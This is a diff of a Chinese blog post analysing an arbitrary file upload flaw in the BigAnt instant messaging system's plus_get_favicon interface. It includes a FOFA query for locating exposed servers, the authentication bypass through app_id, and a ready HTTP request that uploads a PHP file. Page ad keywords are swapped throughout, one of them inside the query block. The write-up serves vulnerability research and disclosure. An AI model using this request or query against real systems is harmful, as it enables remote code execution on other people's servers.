@@ -4,23 +4,6 @@ source: https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html
 asset_dir: embedded-base64
 ---
 
-# 大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞
-
-[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/24 13:16
-- 371浏览
-- [0评论](#comment)
-- 30分钟阅读
-
-深入探索
-
-软件
-
-即时通信
-
-客户端
-
----
-
 # 漏洞简介
 
 杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 plus\_get\_favicon 接口存在任意文件写入/[上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者可以通过上传特制的 PHP 文件，执行恶意代码，实现服务器的远程控制，可能导致敏感信息泄露、数据篡改等危害。
@@ -39,15 +22,17 @@ BigAnt 5.5.x 及以上版本用户
 
 深入探索
 
-IM
+防火墙软件
 
-服务器
+VPN服务
 
-安全认证考试
+Web安全书籍
 
 # fofa语法
 
 > (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"
+>
+> 防病毒程序与恶意软件
 
 # 漏洞分析
 
@@ -57,19 +42,17 @@ IM
 
 最开始的初始化部分定义了如果**app\_id**=**pc\_clientz 那么就不需要鉴权.**
 
-防病毒程序与恶意软件
-
 深入探索
 
-即时通讯
+网络安全课程
 
-exploit
+Docker加速服务
 
-client
+云安全解决方案
 
 再看 `plus_get_favicon()` 方法的实现逻辑
 
-计算机服务器
+网络
 
 ```
 public function plus_get_favicon(){
@@ -131,7 +114,7 @@ public function plus_get_favicon(){
 
 > 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式
 >
-> 网络
+> 软件
 >
 > /api/dispersedOrg/plus\_get\_favicon.html
 >
@@ -141,7 +124,7 @@ public function plus_get_favicon(){
 
 在本地http服务的默认首页如 index.html 文件内容包含 `<link rel="icon" href="/del.php">` 这种可以通过正则校验以及测试文件del.php的内容。
 
-网络安全
+网络
 
 ```
 POST /?m=Admin&c=Plus&a=plus_get_favicon HTTP/1.1
@@ -155,29 +138,4 @@ plus_uri=http://127.0.0.1:80&app_id=pc_client
 
 如上图所示，我们成功上传文件到`/data/plus_favicon/`目录下。
 
-计算机服务器
-
-- 标签：
-- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
-- [#php](https://mrxn.net/tag/php)
-- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
-- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
-- [#0day](https://mrxn.net/tag/0day)
-- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
-
----
-
-文章目录
-
-- [1.漏洞简介](#toc-1-)
-- [2.影响版本](#toc-2-)
-- [3.fofa语法](#toc-3-)
-- [4.漏洞分析](#toc-4-)
-- [5.漏洞复现](#toc-5-)
-
-  
-  
-
-![](data:image/png;base64,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)
-
-手机扫码阅读
+漏洞扫描服务
